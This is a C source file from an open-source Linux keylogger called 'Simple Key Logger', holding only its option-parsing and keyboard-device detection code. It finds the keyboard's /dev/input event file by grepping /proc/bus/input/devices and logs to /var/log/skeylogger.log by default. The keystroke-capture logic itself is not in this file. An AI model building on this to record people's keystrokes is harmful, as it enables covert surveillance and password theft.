#include <getopt.h>
#include <stdio.h>
#include <stdlib.h> // exit
#include <string.h>

#include "options.h"
#include "util.h"

#define VERSION "0.0.1"

static void printHelp();
static void printVersion();
static char *getKeyboardDeviceFileName();

static const char short_opts[] = "hvl:d:";
static struct option long_opts[] = {
   {"help",    no_argument,         0, 'h'},
   {"version", no_argument,         0, 'v'},
   {"logfile", required_argument,   0, 'l'},
   {"device",  required_argument,   0, 'd'},
   {0, 0, 0, 0}
};

/**
 * Detects and returns the name of the keyboard device file. This function uses
 * the fact that all device information is shown in /proc/bus/input/devices and
 * the keyboard device file should always have an EV of 120013
 *
 * @return the name of the keyboard device file
 */
static char *getKeyboardDeviceFileName() {
   static const char *command =
      "grep -E 'Handlers|EV' /proc/bus/input/devices |"
      "grep -B1 120013 |"
      "grep -Eo event[0-9]+ |"
      "tr '\\n' '\\0'";

   FILE *pipe = popen(command, "r");
   if (pipe == NULL) {
      LOG_ERROR("Could not determine keyboard device file");
   }

   char result[20] = "/dev/input/";
   char temp[9];
   fgets(temp, 9, pipe);

   pclose(pipe);
   return strdup(strcat(result, temp));
}

void parseOptions(int argc, char **argv, Config *config) {
   config->deviceFile = getKeyboardDeviceFileName();
   config->logFile = "/var/log/skeylogger.log";

   int index;
   int opt = 0;
   while (opt != -1) {
      opt = getopt_long(argc, argv, short_opts, long_opts, &index);

      switch (opt) {
      case 'h':
         printHelp();
         exit(0);
         break;
      case 'v':
         printVersion();
         exit(0);
         break;
      case 'l':
         config->logFile = strdup(optarg);
         break;
      case 'd':
         config->deviceFile = strdup(optarg);
         break;
      case '?':
         // Errors handled automatically
         break;
      }
   }
}

static void printHelp() {
   printf("%s\n", "Usage: skeylogger [OPTION]\n"
          "Logs pressed keys\n\n"
          "  -h, --help\t\tDisplays this help message\n"
          "  -v, --version\t\tDisplays version information\n"
          "  -l, --logfile\t\tPath to the logfile\n"
          "  -d, --device\t\tPath to device file (/dev/input/eventX)\n");
}

static void printVersion() {
   printf("%s\n", "Simple Key Logger version " VERSION);
}